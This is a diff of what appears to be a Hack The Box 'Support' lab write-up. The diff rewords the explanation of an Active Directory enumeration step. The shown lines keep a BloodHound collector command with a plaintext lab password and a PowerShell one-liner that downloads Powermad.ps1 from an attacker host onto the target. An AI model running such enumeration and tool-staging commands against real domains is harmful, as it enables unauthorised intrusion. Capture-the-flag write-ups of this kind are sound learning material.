@@ -1297,7 +1297,8 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```
 
-Running bloodhound collector with `support` creds
+ bloodhound collector with `support` creds is used to create json files which contain information about the objects present in the AD environment, and later ingest them into bloodhound:
+ 
 ```
  bloodhound-ce-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.50.211 -c All
 
@@ -1338,7 +1339,7 @@ INFO: Querying computer: dc.support.htb
 INFO: Done in 00M 07S
 ```
 
-Bloodhound pic:
+
 
 ```
  (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/Powermad.ps1','C:\Users\support\Documents\Powermad.ps1')
